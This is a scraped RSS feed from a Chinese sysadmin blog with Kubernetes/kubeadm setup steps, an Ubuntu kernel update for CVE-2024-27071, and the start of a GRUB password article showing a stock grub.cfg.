<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>验证安装结果</p>
<blockquote>
<p>kubeadm version</p>
</blockquote>
<p>kubeadm version: &amp;version.Info{Major:"1", Minor:"28", GitVersion:"v1.28.7", GitCommit:"c8dcb00be9961ec36d141d2e4103f85f92bcf291", GitTreeState:"clean", BuildDate:"2024-02-14T10:39:01Z", GoVersion:"go1.21.7", Compiler:"gc", Platform:"linux/amd64"}</p>
<h3>系统内核配置</h3>
<h4>禁用Swap分区</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 临时禁用swap</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">swapoff</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -a</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 永久禁用（注释fstab中的swap配置）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sed</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '/ swap / s/^\(.*\)$/#\1/g'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/fstab</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>加载内核模块</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 创建模块配置文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/modules-load.d/containerd.conf</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">overlay</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">br_netfilter</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 立即加载内核模块</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">modprobe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> overlay</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">modprobe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> br_netfilter</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>网络参数配置</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 创建网络调优配置文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/sysctl.d/kubernetes.conf</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.bridge.bridge-nf-call-ip6tables = 1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.bridge.bridge-nf-call-iptables = 1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.ip_forward = 1</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 应用配置</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sysctl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --system</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>安装Kubernetes集群</h3>
<p>获取kubeadm 默认配置</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kubeadm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> print</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> init-defaults</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">kubeadm.conf</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>修改4处地方</p>
<ul>
<li>localAPIEndpoint.advertiseAddress为master的ip；</li>
<li>nodeRegistration.name 为当前节点名称；</li>
<li>imageRepository为国内源：registry.cn-hangzhou.aliyuncs.com/google_containerspodSubnet 设置pod网段，这里必须 192.168.0.0/16，因为下面安装CNI 插件<code>Calico</code>已经固定网段,如果要安装其他插件自行修改</li>
<li>kubernetesVersion: 1.29.2 ，查看了kubeadm 版本为1.29.2 ，默认是1.29.0</li>
</ul>
<p>修改配置如下</p>
<div class="language-yaml line-numbers-mode" data-highlighter="shiki" data-ext="yaml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">apiVersion</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">kubeadm.k8s.io/v1beta3</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">bootstrapTokens</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">- </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">groups</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">system:bootstrappers:kubeadm:default-node-token</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  token</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">abcdef.0123456789abcdef</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  ttl</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">24h0m0s</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  usages</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">signing</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">authentication</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">kind</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">InitConfiguration</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">localAPIEndpoint</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  advertiseAddress</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">172.28.14.94</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #当前主机IP</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  bindPort</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">6443</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">nodeRegistration</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  criSocket</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">unix:///var/run/containerd/containerd.sock</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  imagePullPolicy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">IfNotPresent</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ser</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  taints</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">null</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Ubuntu修复CNVD-2024-4920726</title>
      <link>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E4%BF%AE%E5%A4%8DCNVD-2024-4920726.html</link>
      <guid>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E4%BF%AE%E5%A4%8DCNVD-2024-4920726.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Ubuntu修复CNVD-2024-4920726</source>
      <description>Ubuntu修复CNVD-2024-4920726 CNVD-2024-4920726简介 影响版本：Linux Linux kernel &amp;gt;=6.8，&amp;lt;6.8.2 CVE编号：CVE-2024-27071 描述：是在Linux内核中，以下漏洞已得到解决：backlight：hx8357：修复潜在的NULL指针解引用“im”引脚是可选的。在hx8357...</description>
      <pubDate>Tue, 21 Jan 2025 10:07:29 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>CNVD-2024-4920726简介</h2>
<ul class="task-list-container">
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-0" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-0"> 影响版本：Linux Linux kernel &gt;=6.8，&lt;6.8.2</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-1" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-1"> CVE编号：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27071" target="_blank" rel="noopener noreferrer">CVE-2024-27071</a></label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-2" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-2"> 描述：是在Linux内核中，以下漏洞已得到解决：backlight：hx8357：修复潜在的NULL指针解引用“im”引脚是可选的。在hx8357_probe（）中添加缺失检查。</label></li>
</ul>
<h2>修复方法</h2>
<p>更新内核</p>
<h3>从主线下载deb包</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mkdir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kernel-6.9.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &amp;&amp; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kernel-6.9.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://kernel.ubuntu.com/mainline/v6.9/amd64/linux-headers-6.9.0-060900-generic_6.9.0-060900.202405122134_amd64.deb</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://kernel.ubuntu.com/mainline/v6.9/amd64/linux-headers-6.9.0-060900_6.9.0-060900.202405122134_all.deb</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://kernel.ubuntu.com/mainline/v6.9/amd64/linux-image-unsigned-6.9.0-060900-generic_6.9.0-060900.202405122134_amd64.deb</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://kernel.ubuntu.com/mainline/v6.9/amd64/linux-modules-6.9.0-060900-generic_6.9.0-060900.202405122134_amd64.deb</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>安装deb包</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kernel-6.9.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ./</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h2>设置为开机启动使用</h2>
<p>正常安装好已经是第一项了</p>
]]></content:encoded>
    </item>
    <item>
      <title>GRUB锁定密码</title>
      <link>https://www.geekery.cn/note-book/GRUB/GRUB%E9%94%81%E5%AE%9A%E5%AF%86%E7%A0%81.html</link>
      <guid>https://www.geekery.cn/note-book/GRUB/GRUB%E9%94%81%E5%AE%9A%E5%AF%86%E7%A0%81.html</guid>
      <source url="https://www.geekery.cn/rss.xml">GRUB锁定密码</source>
      <description>GRUB锁定密码 该方法用于设置一个无法修改的用户密码，即使已经拥有root权限并且已经修改了密码，重启设备密码会自动恢复。 修改如下文件 L79-L88</description>
      <pubDate>Sun, 19 Jan 2025 16:32:20 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>该方法用于设置一个无法修改的用户密码，即使已经拥有root权限并且已经修改了密码，重启设备密码会自动恢复。</p>
</blockquote>
<h2>修改如下文件</h2>
<p>L79-L88</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@ubuntu grub2]# cat grub.cfg</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># DO NOT EDIT THIS FILE</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># It is automatically generated by grub2-mkconfig using templates</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># from /etc/grub.d and settings from /etc/default/grub</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/00_header ###</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pager=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-s</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $prefix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/grubenv ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  load_env</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">next_entry</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ] ; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">   set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default="</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">next_entry</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">   set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> next_entry=</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   save_env</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> next_entry</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">   set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> boot_once=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">else</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">   set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default="</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">saved_entry</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">feature_menuentry_id</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  menuentry_id_option</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"--id"</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">else</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  menuentry_id_option</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> menuentry_id_option</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">prev_saved_entry</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> saved_entry="</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">prev_saved_entry</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  save_env</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> saved_entry</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> prev_saved_entry=</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  save_env</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> prev_saved_entry</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> boot_once=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">function</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> savedefault</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-z</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">boot_once</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    saved_entry</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">chosen</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    save_env</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> saved_entry</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  fi</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">function</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> load_video</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$feature_all_video_module</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> all_video</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">  else</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> efi_gop</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> efi_uga</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ieee1275_fb</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vbe</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vga</span></span>
